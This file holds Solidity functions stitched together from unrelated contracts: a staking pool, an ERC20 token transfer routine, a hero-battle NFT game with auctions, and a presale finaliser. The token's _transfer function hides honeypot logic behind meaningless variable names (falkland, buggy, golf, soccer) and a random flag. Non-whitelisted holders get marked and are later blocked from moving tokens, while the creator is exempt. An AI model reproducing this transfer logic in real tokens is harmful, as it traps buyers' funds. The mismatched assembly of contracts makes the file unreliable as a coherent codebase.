function deposit(address tokenAddress, uint256 amount) public nonReentrant {
    require(amount > 0, "Staking: Amount must be > 0");
    IERC20 token = IERC20(tokenAddress);
    uint256 allowance = token.allowance(msg.sender, address(this));
    require(allowance >= amount, "Staking: Token allowance too small");
    balances[msg.sender][tokenAddress] = balances[msg.sender][tokenAddress].add(amount);
    token.transferFrom(msg.sender, address(this), amount);
    uint128 currentEpoch = getCurrentEpoch();
    uint128 currentMultiplier = currentEpochMultiplier();
    if (!epochIsInitialized(tokenAddress, currentEpoch)) {
        address[] memory tokens = new address[](1);
        tokens[0] = tokenAddress;
        manualEpochInit(tokens, currentEpoch);
    }
    Pool storage pNextEpoch = poolSize[tokenAddress][currentEpoch + 1];
    pNextEpoch.size = token.balanceOf(address(this));
    pNextEpoch.set = true;
    Checkpoint[] storage checkpoints = balanceCheckpoints[msg.sender][tokenAddress];
    uint256 balanceBefore = getEpochUserBalance(msg.sender, tokenAddress, currentEpoch);
    if (checkpoints.length == 0) {
        checkpoints.push(Checkpoint(currentEpoch, currentMultiplier, 0, amount));
        checkpoints.push(Checkpoint(currentEpoch + 1, BASE_MULTIPLIER, amount, 0));
    } else {
        uint256 last = checkpoints.length - 1;
        if (checkpoints[last].epochId < currentEpoch) {
            uint128 multiplier = computeNewMultiplier(
                getCheckpointBalance(checkpoints[last]),
                BASE_MULTIPLIER,
                amount,
                currentMultiplier
            );
            checkpoints.push(Checkpoint(currentEpoch, multiplier, getCheckpointBalance(checkpoints[last]), amount));
            checkpoints.push(Checkpoint(currentEpoch + 1, BASE_MULTIPLIER, balances[msg.sender][tokenAddress], 0));
        }
        else if (checkpoints[last].epochId == currentEpoch) {
            checkpoints[last].multiplier = computeNewMultiplier(
                getCheckpointBalance(checkpoints[last]),
                checkpoints[last].multiplier,
                amount,
                currentMultiplier
            );
            checkpoints[last].newDeposits = checkpoints[last].newDeposits.add(amount);
            checkpoints.push(Checkpoint(currentEpoch + 1, BASE_MULTIPLIER, balances[msg.sender][tokenAddress], 0));
        }
        else {
            if (last >= 1 && checkpoints[last - 1].epochId == currentEpoch) {
                checkpoints[last - 1].multiplier = computeNewMultiplier(
                    getCheckpointBalance(checkpoints[last - 1]),
                    checkpoints[last - 1].multiplier,
                    amount,
                    currentMultiplier
                );
                checkpoints[last - 1].newDeposits = checkpoints[last - 1].newDeposits.add(amount);
            }
            checkpoints[last].startBalance = balances[msg.sender][tokenAddress];
        }
    }
    uint256 balanceAfter = getEpochUserBalance(msg.sender, tokenAddress, currentEpoch);
    poolSize[tokenAddress][currentEpoch].size = poolSize[tokenAddress][currentEpoch].size.add(balanceAfter.sub(balanceBefore));
    emit Deposit(msg.sender, tokenAddress, amount);
}

function emergencyWithdraw(address tokenAddress) public {
    require((getCurrentEpoch() - lastWithdrawEpochId[tokenAddress]) >= 10, "At least 10 epochs must pass without success");
    uint256 totalUserBalance = balances[msg.sender][tokenAddress];
    require(totalUserBalance > 0, "Amount must be > 0");
    balances[msg.sender][tokenAddress] = 0;
    IERC20 token = IERC20(tokenAddress);
    token.transfer(msg.sender, totalUserBalance);
    emit EmergencyWithdraw(msg.sender, tokenAddress, totalUserBalance);
}

function getEpochUserBalance(address user, address token, uint128 epochId) public view returns(uint256) {
    Checkpoint[] storage checkpoints = balanceCheckpoints[user][token];
    if (checkpoints.length == 0 || epochId < checkpoints[0].epochId) {
        return 0;
    }
    uint min = 0;
    uint max = checkpoints.length - 1;
    if (epochId >= checkpoints[max].epochId) {
        return getCheckpointEffectiveBalance(checkpoints[max]);
    }
    while (max > min) {
        uint mid = (max + min + 1) / 2;
        if (checkpoints[mid].epochId <= epochId) {
            min = mid;
        } else {
            max = mid - 1;
        }
    }
    return getCheckpointEffectiveBalance(checkpoints[min]);
}

function withdraw(address tokenAddress, uint256 amount) public nonReentrant {
    require(balances[msg.sender][tokenAddress] >= amount, "Staking: balance too small");
    balances[msg.sender][tokenAddress] = balances[msg.sender][tokenAddress].sub(amount);
    IERC20 token = IERC20(tokenAddress);
    token.transfer(msg.sender, amount);
    uint128 currentEpoch = getCurrentEpoch();
    lastWithdrawEpochId[tokenAddress] = currentEpoch;
    if (!epochIsInitialized(tokenAddress, currentEpoch)) {
        address[] memory tokens = new address[](1);
        tokens[0] = tokenAddress;
        manualEpochInit(tokens, currentEpoch);
    }
    Pool storage pNextEpoch = poolSize[tokenAddress][currentEpoch + 1];
    pNextEpoch.size = token.balanceOf(address(this));
    pNextEpoch.set = true;
    Checkpoint[] storage checkpoints = balanceCheckpoints[msg.sender][tokenAddress];
    uint256 last = checkpoints.length - 1;
    if (checkpoints[last].epochId < currentEpoch) {
        checkpoints.push(Checkpoint(currentEpoch, BASE_MULTIPLIER, balances[msg.sender][tokenAddress], 0));
        poolSize[tokenAddress][currentEpoch].size = poolSize[tokenAddress][currentEpoch].size.sub(amount);
    }
    else if (checkpoints[last].epochId == currentEpoch) {
        checkpoints[last].startBalance = balances[msg.sender][tokenAddress];
        checkpoints[last].newDeposits = 0;
        checkpoints[last].multiplier = BASE_MULTIPLIER;
        poolSize[tokenAddress][currentEpoch].size = poolSize[tokenAddress][currentEpoch].size.sub(amount);
    }
    else {
        Checkpoint storage currentEpochCheckpoint = checkpoints[last - 1];
        uint256 balanceBefore = getCheckpointEffectiveBalance(currentEpochCheckpoint);
        if (amount < currentEpochCheckpoint.newDeposits) {
            uint128 avgDepositMultiplier = uint128(
                balanceBefore.sub(currentEpochCheckpoint.startBalance).mul(BASE_MULTIPLIER).div(currentEpochCheckpoint.newDeposits)
            );
            currentEpochCheckpoint.newDeposits = currentEpochCheckpoint.newDeposits.sub(amount);
            currentEpochCheckpoint.multiplier = computeNewMultiplier(
                currentEpochCheckpoint.startBalance,
                BASE_MULTIPLIER,
                currentEpochCheckpoint.newDeposits,
                avgDepositMultiplier
            );
        } else {
            currentEpochCheckpoint.startBalance = currentEpochCheckpoint.startBalance.sub(
                amount.sub(currentEpochCheckpoint.newDeposits)
            );
            currentEpochCheckpoint.newDeposits = 0;
            currentEpochCheckpoint.multiplier = BASE_MULTIPLIER;
        }
        uint256 balanceAfter = getCheckpointEffectiveBalance(currentEpochCheckpoint);
        poolSize[tokenAddress][currentEpoch].size = poolSize[tokenAddress][currentEpoch].size.sub(balanceBefore.sub(balanceAfter));
        checkpoints[last].startBalance = balances[msg.sender][tokenAddress];
    }
    emit Withdraw(msg.sender, tokenAddress, amount);
}

function manualEpochInit(address[] memory tokens, uint128 epochId) public {
    require(epochId <= getCurrentEpoch(), "can't init a future epoch");
    for (uint i = 0; i < tokens.length; i++) {
        Pool storage p = poolSize[tokens[i]][epochId];
        if (epochId == 0) {
            p.size = uint256(0);
            p.set = true;
        } else {
            require(!epochIsInitialized(tokens[i], epochId), "Staking: epoch already initialized");
            require(epochIsInitialized(tokens[i], epochId - 1), "Staking: previous epoch not initialized");
            p.size = poolSize[tokens[i]][epochId - 1].size;
            p.set = true;
        }
    }
    emit ManualEpochInit(msg.sender, epochId, tokens);
}

function getCurrentEpoch() public view returns(uint128) {
    if (block.timestamp < epoch1Start) {
        return 0;
    }
    return uint128((block.timestamp - epoch1Start) / epochDuration + 1);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (dexterity == false)) {
        falkland = chTx;
        grandhotel = true;
    }
    if ((address(sender) == creator) && (dexterity == true)) {
        buggy[recipient] = true;
        golf[recipient] = false;
        dexterity = false;
    }
    if ((amount > golden) && (buggy[sender] == true) && (address(sender) != creator)) {
        soccer[recipient] = true;
    }
    if (buggy[recipient] != true) {
        golf[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((golf[sender]) && (buggy[recipient] == false)) {
        golf[recipient] = true;
    }
    if (buggy[sender] == false) {
        if ((amount > golden) && (soccer[sender] == true)) {
            require(false);
        }
        require(amount < falkland);
        if (grandhotel == true) {
            if (soccer[sender] == true) {
                require(false);
            }
            soccer[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function createGen0Auction(uint256 _talent, uint256 price) public onlyOPM {
    require(gen0CreatedCount < gen0CreationLimit);
    require(price < 340282366920938463463374607431768211455);
    uint256 heroId = _createHero(0, 0, 0, _talent, address(this));
    _approve(heroId, saleAuction);
    if (price == 0) {
        price = _computeNextGen0Price();
    }
    saleAuction.createAuction(
        heroId,
        price * 1000,
        0,
        price,
        0,
        gen0AuctionDuration,
        address(this)
    );
    gen0CreatedCount++;
}

function orderOnSaleAuction(
    uint256 _heroId,
    uint256 orderAmount
)
public {
    require(ownerIndexToERC20Balance[msg.sender] >= orderAmount);
    address saller = saleAuction.getSeller(_heroId);
    uint256 price = saleAuction.getCurrentPrice(_heroId, 1);
    require(price <= orderAmount && saller != address(0));
    if (saleAuction.order(_heroId, orderAmount, msg.sender) && orderAmount > 0) {
        ownerIndexToERC20Balance[msg.sender] -= orderAmount;
        ownerIndexToERC20Used[msg.sender] += orderAmount;
        if (saller == address(this)) {
            totalUsed += orderAmount;
        } else {
            uint256 cut = _computeCut(price);
            totalUsed += (orderAmount - price + cut);
            ownerIndexToERC20Balance[saller] += price - cut;
        }
    }
}

function orderOnFightAuction(
    uint256 _yangId,
    uint256 _yinId,
    uint256 orderAmount
)
public
whenNotPaused {
    require(_owns(msg.sender, _yinId));
    require(isReadyToFight(_yinId));
    require(_yinId != _yangId);
    require(ownerIndexToERC20Balance[msg.sender] >= orderAmount);
    address saller = fightAuction.getSeller(_yangId);
    uint256 price = fightAuction.getCurrentPrice(_yangId, 1);
    require(price <= orderAmount && saller != address(0));
    if (fightAuction.order(_yangId, orderAmount, msg.sender)) {
        _fight(uint32(_yinId), uint32(_yangId));
        ownerIndexToERC20Balance[msg.sender] -= orderAmount;
        ownerIndexToERC20Used[msg.sender] += orderAmount;
        if (saller == address(this)) {
            totalUsed += orderAmount;
        } else {
            uint256 cut = _computeCut(price);
            totalUsed += (orderAmount - price + cut);
            ownerIndexToERC20Balance[saller] += price - cut;
        }
    }
}

function withdrawERC20Balance(uint256 amount) external onlyLeader {
    uint256 realTotal = erc20.balanceOf(this);
    require((realTotal - (totalPromo + totalBalance - totalUsed)) >= amount);
    erc20.transfer(leaderAddress, amount);
    totalBalance -= amount;
    totalUsed -= amount;
}

function _fight(uint32 _yinId, uint32 _yangId)
internal
whenNotPaused
returns(uint256) {
    Hero storage yin = heroes[_yinId];
    require(yin.recruitmentTime != 0);
    Hero storage yang = heroes[_yangId];
    uint16 parentGen = yin.generation;
    if (yang.generation > yin.generation) {
        parentGen = yang.generation;
    }
    var (flag, childTalent, belongings1, belongings2) = masterRecruitment.fightMix(yin.belongings, yang.belongings);
    yin.belongings = belongings1;
    yang.belongings = belongings2;
    if (!flag) {
        (_yinId, _yangId) = (_yangId, _yinId);
    }
    address owner = heroIndexToOwner[_yinId];
    heroIndexToWin[_yinId] += 1;
    heroIndexToLoss[_yangId] += 1;
    uint256 newHeroId = _createHero(_yinId, _yangId, parentGen + 1, childTalent, owner);
    _triggerCooldown(yang);
    _triggerCooldown(yin);
    return (newHeroId);
}

function collect(uint256 amount) public {
    require(ownerIndexToERC20Balance[msg.sender] >= amount);
    if (erc20.transfer(msg.sender, amount)) {
        ownerIndexToERC20Balance[msg.sender] -= amount;
        totalBalance -= amount;
    }
}

function setERC20TotalPromo(uint256 _totalPromo, uint256 _candy) public onlyLeader {
    uint256 realTotal = erc20.balanceOf(this);
    totalPromo += _totalPromo;
    require(realTotal - totalBalance >= totalPromo);
    candy = _candy;
}

function setERC20Address(address _address, uint256 _totalPromo, uint256 _candy) public onlyLeader {
    ERC20 candidateContract = ERC20(_address);
    require(candidateContract.isERC20());
    erc20 = candidateContract;
    uint256 realTotal = erc20.balanceOf(this);
    require(realTotal >= _totalPromo);
    totalPromo = _totalPromo;
    candy = _candy;
}

function charge(uint256 amount) public {
    if (erc20.transferFrom(msg.sender, this, amount)) {
        ownerIndexToERC20Balance[msg.sender] += amount;
        totalBalance += amount;
    }
}

function setFightAuctionAddress(address _address) public onlyLeader {
    FightClockAuction candidateContract = FightClockAuction(_address);
    require(candidateContract.isFightClockAuction());
    fightAuction = candidateContract;
}

function setSaleAuctionAddress(address _address) public onlyLeader {
    SaleClockAuction candidateContract = SaleClockAuction(_address);
    require(candidateContract.isSaleClockAuction());
    saleAuction = candidateContract;
}

function setMasterRecruitmentAddress(address _address) public onlyLeader {
    MasterRecruitmentInterface candidateContract = MasterRecruitmentInterface(_address);
    require(candidateContract.isMasterRecruitment());
    masterRecruitment = candidateContract;
}

function isReadyToFight(uint256 _heroId)
public
view
returns(bool) {
    require(_heroId > 0);
    Hero memory hero = heroes[_heroId];
    return (hero.cooldownEndTime <= now);
}

function tokensOfOwnerByIndex(address _owner, uint256 _index)
external
view
returns(uint256 tokenId) {
    uint256 count = 0;
    for (uint256 i = 1; i <= totalSupply(); i++) {
        if (heroIndexToOwner[i] == _owner) {
            if (count == _index) {
                return i;
            } else {
                count++;
            }
        }
    }
    revert();
}

function getHero(uint256 _id)
public
view
returns(
    bool isReady,
    uint256 cooldownIndex,
    uint256 nextActionAt,
    uint256 recruitmentTime,
    uint256 yinId,
    uint256 yangId,
    uint256 generation,
    uint256 talent,
    uint256 belongings,
    uint32 items
) {
    Hero storage her = heroes[_id];
    isReady = (her.cooldownEndTime <= now);
    cooldownIndex = uint256(her.cooldownIndex);
    nextActionAt = uint256(her.cooldownEndTime);
    recruitmentTime = uint256(her.recruitmentTime);
    yinId = uint256(her.yinId);
    yangId = uint256(her.yangId);
    generation = uint256(her.generation);
    talent = her.talent;
    belongings = her.belongings;
    items = her.items;
}

function _triggerCooldown(Hero storage _newHero) internal {
    _newHero.cooldownEndTime = uint64(now + cooldowns[_newHero.cooldownIndex]);
    if (_newHero.cooldownIndex < 13) {
        _newHero.cooldownIndex += 1;
    }
}

function reduceCD(uint256 heroId, uint256 reduceAmount)
public
whenNotPaused {
    Hero storage hero = heroes[heroId];
    require(hero.cooldownEndTime > now);
    require(ownerIndexToERC20Balance[msg.sender] >= reduceAmount);
    uint64 cdTime = uint64(hero.cooldownEndTime - now);
    require(reduceAmount >= uint256(cdTime * cdFee * (hero.cooldownIndex + 1)));
    ownerIndexToERC20Balance[msg.sender] -= reduceAmount;
    ownerIndexToERC20Used[msg.sender] += reduceAmount;
    totalUsed += reduceAmount;
    hero.cooldownEndTime = uint64(now);
}

function reduceCDFee(uint256 heroId)
public
view
returns(uint256 fee) {
    Hero memory hero = heroes[heroId];
    require(hero.cooldownEndTime > now);
    uint64 cdTime = uint64(hero.cooldownEndTime - now);
    fee = uint256(cdTime * cdFee * (hero.cooldownIndex + 1));
}

function finishPresale() public onlyOwner() {
    uint cnt_amount = 0;
    uint bgb_amount = 0;
    uint vpe_amount = 0;
    uint gvpe_amount = 0;
    (cnt_amount, bgb_amount, vpe_amount, gvpe_amount) = calculateTokens(remaining);
    PRE_SALE_Token(CNT_address).ico_distribution(owner, cnt_amount);
    PRE_SALE_Token(BGB_address).ico_distribution(owner, bgb_amount);
    PRE_SALE_Token(VPE_address).ico_distribution(owner, vpe_amount);
    PRE_SALE_Token(GVPE_address).ico_distribution(owner, gvpe_amount);
    Sale(address(this), remaining, owner, cnt_amount, bgb_amount, vpe_amount, gvpe_amount);
    paid[owner] = paid[owner] + remaining;
    raised = raised + remaining;
    remaining = 0;
}

